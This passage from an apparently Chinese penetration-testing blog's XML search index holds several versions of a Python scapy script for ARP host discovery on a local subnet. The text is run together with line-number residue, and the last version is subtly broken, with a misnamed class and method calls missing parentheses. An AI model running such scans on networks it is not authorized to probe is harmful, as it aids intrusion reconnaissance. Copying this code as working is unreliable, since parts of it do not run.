sys.exit()&gt;&gt; interface = str(sys.argv[1])&gt;&gt; ip = subprocess.check_output(&gt; "ifconfig " + interface + " | grep 'inet' | cut -d'.' -f 1-3 | cut -d' ' -f 10 | cut -d 'f' -f 1 ",&gt; shell = True).strip()&gt; prefix = ip.split('.')[0] + '.' + ip.split('.')[1] + '.' + ip.split('.')[2] + '.'&gt;&gt;&gt; class MyThread(threading.Thread):&gt; def __init__(self):&gt; threading.Thread.__init__(self)&gt;&gt; def run(self):&gt; global answer,lock,n&gt; time.sleep(0.1)&gt; if lock.acquire():&gt; answer = sr1(ARP(pdst = prefix + str(n)),timeout = 1,verbose = 0)&gt; if answer == None:&gt; pass&gt; else:&gt; print prefix + str(n)&gt; n += 1&gt; lock.release()&gt;&gt;&gt; if __name__ == '__main__':&gt; n = 1&gt; ThreadList = []&gt; lock = threading.Lock()&gt; for addr in range(1,254):&gt; t = MyThread()&gt; ThreadList.append(t)&gt; for t in ThreadList:&gt; t.start()&gt; for t in ThreadList:&gt; t.join()&gt; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051&gt; #!/usr/bin/python&gt; # -*- coding:utf-8 -*-&gt; import logging&gt; import subprocess&gt; import threading,time&gt;&gt; logging.getLogger("scapy.runtime").setLevel(logging.ERROR)&gt; from scapy.all import *&gt;&gt; if len(sys.argv) != 2:&gt; print "Usage - ./arp_disc.py [interface]"&gt; print "Example - ./arp_disc.py eth0"&gt; print "Example will perform an ARP scan of the local subnet to which eth0 is assigned"&gt; sys.exit()&gt;&gt; interface = str(sys.argv[1])&gt;&gt; ip = subprocess.check_output(&gt; "ifconfig " + interface + " | grep 'inet' | cut -d'.' -f 1-3 | cut -d' ' -f 10 | cut -d 'f' -f 1 ",&gt; shell = True).strip()&gt; prefix = ip.split('.')[0] + '.' + ip.split('.')[1] + '.' + ip.split('.')[2] + '.'&gt;&gt;&gt; class MyThread(threading.Thread):&gt; def __init__(self):&gt; threading.Thread.__init__(self)&gt;&gt; def run(self):&gt; global answer,lock&gt; time.sleep(0.1)&gt; if lock.acquire():&gt; for addr in range(1,254):&gt; answer = sr1(ARP(pdst = prefix + str(addr)),timeout = 1,verbose = 0)&gt; if answer == None:&gt; pass&gt; else:&gt; print prefix + str(addr)&gt; lock.release()&gt;&gt;&gt; if __name__ == '__main__':&gt; ThreadList = []&gt; lock = threading.Lock()&gt; for addr in range(1,200):&gt; t = MyThread()&gt; ThreadList.append(t)&gt; for t in ThreadList:&gt; t.start()&gt; for t in ThreadList:&gt; t.join()&gt; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&gt; #!/usr/bin/python&gt; # -*- coding:utf-8 -*-&gt;&gt; import logging&gt; import subprocess&gt; import threading,time&gt;&gt; logging.getLogger("scapy.runtime").setLevel(logging.ERROR)&gt; from scapy.all import *&gt;&gt; if len(sys.argv) != 2:&gt; print "Usage - ./arp_disc.py [filename]"&gt; print "Example - ./arp_disc.py ip_list.txt"&gt; print "Example will perform an ARP scan of the local subnet to which eth0 is assigned"&gt; sys.exit()&gt;&gt; filename = str(sys.argv[1])&gt; file = open(filename,'r') # 打开文件列表&gt;&gt;&gt; class Mythread(threading.Thread):&gt; def __init__(self):&gt; threading.Thread.__init__(self)&gt;&gt; def run(self):&gt; global lock&gt; time.sleep(1)&gt; if lock.acquire():&gt; for addr in file:&gt; answer = sr1(ARP(pdst = addr.strip()),timeout = 0.1,&gt; verbose = 0) # verbose=0，不显示报错的具体信息,这里循环打开的是文件中的每一行IP地址&gt; if answer == None:&gt; pass&gt; else:&gt; print addr.strip() # 将报错信息打印出来&gt;&gt;&gt; if __name__ == '__main__':&gt; ThreadList = []&gt; lock = threading.Lock()&gt; for addr in range(1,200):&gt; t = MyThread()&gt; ThreadList.append(t)&gt; for t in ThreadList:&gt; t.start&gt; for t in ThreadList:&gt; t.join&gt;&gt;]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>parrot</tag>
        <tag>信息收集</tag>
      </tags>
  </entry>
</search>
